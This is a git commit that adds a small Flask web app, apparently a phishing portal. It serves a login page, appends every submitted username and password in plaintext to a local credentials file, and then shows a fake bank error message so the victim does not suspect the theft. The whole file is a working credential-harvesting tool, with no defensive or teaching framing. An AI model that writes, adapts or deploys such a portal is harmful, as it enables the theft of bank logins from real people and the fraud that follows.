88e68982ea878bfb6ba40d0b068bbd11d854b929
Ben <57101218+Ben-Gendler@users.noreply.github.com>
2023-04-24 16:01:09 +0300

    Add files via upload

---
+++ portal/portal.py
@@ -0,0 +1,24 @@
+from flask import Flask, render_template, request
+import os
+
+app = Flask(__name__)
+
+data_folder = "info"
+credentials_file = 'credentials.txt'
+
+
+@app.route('/', methods=('GET', 'POST'))
+def portal():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        if not os.path.exists(data_folder):
+            os.mkdir(data_folder)
+        with open(os.path.join(data_folder, credentials_file), mode='a') as f:
+            f.write(f'username:{username}  password: {password}\n')
+        return 'unable to access your bank. please try again later'
+    return render_template('login.html')
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
